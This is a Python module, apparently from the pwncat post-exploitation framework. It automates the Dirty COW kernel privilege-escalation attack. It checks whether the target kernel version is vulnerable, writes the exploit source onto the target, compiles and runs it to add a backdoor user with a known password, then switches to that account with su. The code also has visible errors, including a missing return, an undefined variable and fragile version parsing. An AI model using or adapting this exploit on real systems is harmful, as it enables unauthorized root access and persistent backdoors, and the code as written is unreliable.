#!/usr/bin/env python3

from typing import Generator, List
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style
import socket
from io import StringIO, BytesIO
import functools

from pwncat.util import CTRL_C
from pwncat.privesc.base import Method, PrivescError, Technique
from pwncat.file import RemoteBinaryPipe

from pwncat.pysudoers import Sudoers
from pwncat import gtfobins
from pwncat.privesc import Capability
from pwncat import util


class DirtycowMethod(Method):

    name = "dirtycow"
    BINARIES = ["cc", "uname"]

    def __init__(self, pty: "pwncat.pty.PtyHandler"):
        super(DirtycowMethod, self).__init__(pty)
        self.ran_before = False

        with open("data/dirtycow/mini_dirtycow.c") as h:
            self.dc_source = h.read()

        self.dc_source = self.dc_source.replace(
            "PWNCAT_USER", self.pty.privesc.backdoor_user_name
        )
        self.dc_source = self.dc_source.replace(
            "PWNCAT_PASS", self.pty.privesc.backdoor_password
        )

    def enumerate(self, capability: int = Capability.ALL) -> List[Technique]:
        """ Find all techniques known at this time """

        if self.ran_before or (Capability.SHELL & capability):
            return []

        # Determine if this kernel version is vulnerable
        kernel = self.pty.run("uname -r").decode("utf-8").strip()
        triplet = [int(x) for x in kernel.split(".")]
        if triplet[0] > 4:
            raise PrivescError("kernel seemingly not vulnerable")

        if triplet[0] == 4 and triplet[1] == 7 and triplet[2] >= 9:
            raise PrivescError("kernel seemingly not vulnerable")

        if triplet[0] == 4 and triplet[1] == 8 and triplet[2] >= 3:
            raise PrivescError("kernel seemingly not vulnerable")

        if triplet[0] == 4 and triplet[1] == 4 and triplet[2] >= 26:
            raise PrivescError("kernel seemingly not vulnerable")

        techniques = [Technique("root", self, None, Capability.SHELL)]

    def execute(self, technique: Technique):
        """ Run the specified technique """

        self.ran_before = True

        writer = gtfobins.Binary.find_capability(self.pty.which, Capability.WRITE)
        if writer is None:
            raise PrivescError("no file write methods available from gtfobins")

        dc_source_file = self.pty.run("mktemp").decode("utf-8").strip()
        dc_binary = self.pty.run("mktemp").decode("utf-8").strip()

        # Write the file
        self.pty.run(writer.write_file(dc_source, self.dc_source))

        # Compile Dirtycow
        self.pty.run(f"cc -pthread {dc_source_file} -o {dc_binary} -lcrypt")

        # Run Dirtycow
        self.pty.run(dc_binary)

        # Reload /etc/passwd
        self.pty.reload_users()

        if self.pty.privesc.backdoor_user_name not in self.pty.users:
            raise PrivescError("backdoor user not created")

        # Become the new user!
        self.pty.process(f"su {self.pty.privesc.backdoor_user_name}", delim=False)
        self.pty.client.send(self.pty.privesc.backdoor_password.encode("utf-8") + b"\n")

        return "exit"
